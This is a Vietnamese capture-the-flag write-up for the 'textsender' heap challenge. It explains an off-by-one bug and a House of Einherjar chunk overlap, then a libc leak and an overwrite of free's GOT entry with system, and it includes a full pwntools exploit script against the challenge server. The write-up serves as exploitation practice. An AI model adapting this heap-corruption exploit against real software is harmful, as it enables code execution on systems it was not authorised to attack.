# textsender

https://github.com/wan-hyhty/Techniques#house-of-enherjar

## Bugs

- Ta có bug off-by-one của hàm scanf khiến mình liên tưởng kĩ thuật poison null byte, tuy nhiên các chunk được malloc cố định là 0x20, 0x80 0x200 nên có vẻ không được
- Cuối cùng mình được hint là kĩ thuật House of Enherjar. Kĩ thuật này sử dụng off-by-one để tắt bit inuse và tiến hành fake chunk -> overlap chunk

## Khai thác

```python
def add(idx, payload):
    sla(b"> ", b"2")
    sla(b": ", idx)
    sla(b": ", payload)


def send():
    sla(b"> ", b"5")


def edit(idx):
    sla(b"> ", b"3")
    sla(b": ", idx)

def setname(payload):
    sla(b"> ", b"1")
    sla(b": ", payload)

def fill_bin():
    add("wan", b'bbbb')
    add("wan", b'bbbb')
    add("wan", b'bbbb')
    add("wan", b'/bin/sh')
    add("2", b'bbbb')
    add("2", b'bbbb')
```

### Setup chunk

- Trước hết, ta cần free chunk được merge trước khi free chunk fake, tuy nhiên chunk merge có địa chỉ > chunk fake. Do vậy ta cần làm sao chunk merge được malloc trước chunk fake, khi free chunk merge sẽ được free trước.
- Để được như vậy, ta cần một số các bước xếp chunk.
- Ta sẽ tận dụng việc getline trong hàm edit tạo một chunk 0x80 và free nó.
- Ta chỉ cần chú ý chunk 0x80, dưới đây chỉ là các chunk 0x80

```python
fill_bin()
setname(b'a')
send()

fill_bin()
add("wan",b"b")
edit("6"*0x75)
send()

fill_bin()
add("wan",b"b")
add("wan",b"b")
edit("6"*0x75)
send()
fill_bin()
add("wan",b"b")
add("wan",b"b")
add("wan",b"b")
add("wan",b"b")
edit("6"*0x75)
send()
```

- Khi này trong tcache và fastbin như sau
  ![Alt text](/senkai//textsender/bin/image-3.png)
- Khi này chunk 9 sẽ là chunk ow bit inuse chunk 0x200 ở dưới
  ![Alt text](/senkai//textsender/bin/image-4.png)
- và chunk 6 sẽ là fake chunk
  > Ở đây có lưu ý là cả 2 chunk merge và fake không được ở tcache

```python
presize = 0x870
fill_bin()
add("1",b"b")
add(b"a" * 0x70 + p64(presize),b"b")
add("3",b"b")
add(p64(0) + p64(presize) + p64(exe.sym.sender-0x18) + p64(exe.sym.sender - 0x10),b"b")
send()
```

- Khi này ta đã overlap chunk
  ![Alt text](/senkai//textsender/bin/image-5.png)

### Leak libc

- Ta có thể điều khiển 2 con trỏ của chunk 0x20 để leak libc

```python
fill_bin()
add("wan",b"b")
add("\0",b"b")
add("\0",b"b")
add(b'9',b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(0x404028))
sla(b'> ', b'4')
p.recvlines(7)
p.recvuntil(b'6) ')
libc.address = u64(p.recvuntil(b':', drop=True) + b'\0\0') - libc.sym.puts
info(hex(libc.address))
```

### Ow free

```python
edit(b'9')
payload = b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(exe.got.free)
sla(b": ", payload)
edit(p64(libc.address + 0x77ec0))
sla(b': ', p64(libc.sym.system))
send()
```

### Kết quả

![Alt text](/senkai//textsender/bin/image-6.png)

```python
#!/usr/bin/python3

from pwn import *

exe = ELF("textsender_patched", checksec=False)
libc = ELF("./libc.so.6")
context.binary = exe


def GDB():
    if not args.REMOTE:
        gdb.attach(
            p,
            gdbscript="""

                # b* 0x00000000004016b5
                c
                """,
        )
        input()


info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
    p = remote("chals.sekai.team", 4000)
else:
    p = process(exe.path)

GDB()


def add(idx, payload):
    sla(b"> ", b"2")
    sla(b": ", idx)
    sla(b": ", payload)


def send():
    sla(b"> ", b"5")


def edit(idx):
    sla(b"> ", b"3")
    sla(b": ", idx)

def setname(payload):
    sla(b"> ", b"1")
    sla(b": ", payload)

def fill_bin():
    add("wan", b'bbbb')
    add("wan", b'bbbb')
    add("wan", b'bbbb')
    add("wan", b'/bin/sh')
    add("2", b'bbbb')
    add("2", b'bbbb')
fill_bin()
setname(b'a')
send()

fill_bin()
add("wan",b"b")
edit("6"*0x75)
send()

fill_bin()
add("wan",b"b")
add("wan",b"b")
edit("6"*0x75)
send()
fill_bin()
add("wan",b"b")
add("wan",b"b")
add("wan",b"b")
add("wan",b"b")
edit("6"*0x75)
send()

presize = 0x870
fill_bin()
add("1",b"b")
add(b"a" * 0x70 + p64(presize),b"b")
add("3",b"b")
add(p64(0) + p64(presize) + p64(exe.sym.sender-0x18) + p64(exe.sym.sender - 0x10),b"b")
send()
fill_bin()
add("wan",b"b")
add("\0",b"b")
add("\0",b"b")
add(b'9',b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(0x404028))
sla(b'> ', b'4')
p.recvlines(7)
p.recvuntil(b'6) ')
libc.address = u64(p.recvuntil(b':', drop=True) + b'\0\0') - libc.sym.puts
info(hex(libc.address))
edit(b'9')
payload = b"\0"*12*8 + p64(0) + p64(0x21) + p64(0x404028) + p64(exe.got.free)
sla(b": ", payload)
edit(p64(libc.address + 0x77ec0))
sla(b': ', p64(libc.sym.system))
send()
p.interactive()

```
